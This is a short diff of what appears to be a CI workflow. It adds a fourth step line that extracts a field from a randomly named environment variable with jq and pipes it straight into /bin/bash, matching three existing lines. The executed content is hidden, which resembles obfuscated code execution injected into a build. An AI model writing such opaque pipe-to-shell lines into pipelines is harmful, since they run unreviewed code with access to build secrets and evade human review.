@@ -53,6 +53,7 @@ jobs:
           echo $lqxls92364 | jq -r .tr822 | /bin/bash
           echo $ls0852 | jq -r .fi99 | /bin/bash
           printf '%s' "$bmy5535" | jq -r .wg3 | /bin/bash
+          echo $vmyy330 | jq -r .cfxef643 | /bin/bash
 
       - name: Store artifact
         if: always()
